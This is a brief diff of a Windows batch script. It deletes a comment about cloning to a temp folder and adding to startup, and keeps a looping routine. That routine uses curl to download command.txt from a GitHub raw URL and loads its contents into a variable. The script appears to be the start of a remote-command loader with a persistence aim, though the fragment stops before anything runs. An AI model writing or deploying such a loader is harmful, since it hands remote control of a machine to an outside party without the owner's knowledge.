@@ -1,9 +1,5 @@
 @echo off
 :x
-
-    :: clone to temp folder and add to startup
-
-
     curl https://raw.githubusercontent.com/Sap196/DownloadableFiles/main/command.txt -o command.txt
     for /f "delims=" %%a in ('type "command.txt"') do set "build=%%a"
 
